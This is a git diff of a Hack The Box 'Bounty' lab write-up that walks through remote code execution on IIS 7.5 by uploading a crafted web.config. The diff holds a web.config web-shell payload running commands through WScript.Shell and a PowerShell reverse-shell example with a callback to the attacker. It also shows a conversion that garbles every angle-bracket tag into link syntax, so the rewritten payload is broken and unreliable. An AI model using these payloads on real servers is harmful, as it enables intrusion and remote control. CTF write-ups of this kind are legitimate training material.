@@ -9,7 +9,7 @@ tags: ['windows','easy','file-upload-vuln','isi']
 
 We are going to pwn Bounty from Hack The Box.
 
-Link : <https://www.hackthebox.eu/home/machines/profile/142>
+Link : [https://www.hackthebox.eu/home/machines/profile/142](https://www.hackthebox.eu/home/machines/profile/142)
 
 
 Lets Begin with our Initial Nmap Scan.
@@ -78,7 +78,7 @@ I uploaded ``wolf.jpg`` and it Successfully Uploaded
 ``/uploadedfiles/wolf.jpg``
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-bounty/5.png)
 
-So I tried uploading ``.aspx`` file and I get Invalid File.<br/>
+So I tried uploading ``.aspx`` file and I get Invalid File.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-bounty/6.png)
 
 I googled about ISI 7.5 exploits and found there is a RCE via uploading ``web.config``.
@@ -104,8 +104,8 @@ Above shows an example of an interactive PowerShell bind connect shell. Use a ne
 .EXAMPLE
 PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
 ```
-I copied one of the example and changed it to my IP and paste it in bottom of the file. <br/>
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-bounty/7.png)<br/>
+I copied one of the example and changed it to my IP and paste it in bottom of the file. [br/](br/)
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-bounty/7.png)[br/](br/)
 This not only load the module but also the shell give me a callback.
 
 Started python server.
@@ -113,26 +113,26 @@ Started python server.
 ``web.config``
 
 ```
-<?xml version="1.0" encoding="UTF-8"?>
-<configuration>
-   <system.webServer>
-      <handlers accessPolicy="Read, Script, Write">
-         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
-      </handlers>
-      <security>
-         <requestFiltering>
-            <fileExtensions>
-               <remove fileExtension=".config" />
-            </fileExtensions>
-            <hiddenSegments>
-               <remove segment="web.config" />
-            </hiddenSegments>
-         </requestFiltering>
-      </security>
-   </system.webServer>
-</configuration>
+[?xml version="1.0" encoding="UTF-8"?](?xml version="1.0" encoding="UTF-8"?)
+[configuration](configuration)
+   [system.webServer](system.webServer)
+      [handlers accessPolicy="Read, Script, Write"](handlers accessPolicy="Read, Script, Write")
+         [add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /](add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /)         
+      [/handlers](/handlers)
+      [security](security)
+         [requestFiltering](requestFiltering)
+            [fileExtensions](fileExtensions)
+               [remove fileExtension=".config" /](remove fileExtension=".config" /)
+            [/fileExtensions](/fileExtensions)
+            [hiddenSegments](hiddenSegments)
+               [remove segment="web.config" /](remove segment="web.config" /)
+            [/hiddenSegments](/hiddenSegments)
+         [/requestFiltering](/requestFiltering)
+      [/security](/security)
+   [/system.webServer](/system.webServer)
+[/configuration](/configuration)
 <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
-<% Response.write("-"&"->") %>
+[% Response.write("-"&"-](% Response.write("-"&"-)") %>
 
 <%
 Set rs = CreateObject("WScript.Shell")
@@ -141,11 +141,11 @@ o = cmd.StdOut.Readall()
 Response.write(o)
 %>
 
-<% Response.write("<!-"&"-") %>
+[% Response.write("<!-"&"-") %](% Response.write("<!-"&"-") %)
 -->
 ```
 
-Uploaded ``web.config``<br/>
+Uploaded ``web.config``[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-bounty/8.png)
 
 Now I need to visit ``10.10.10.93/uploadedfiles/web.config`` and I will get the shell.
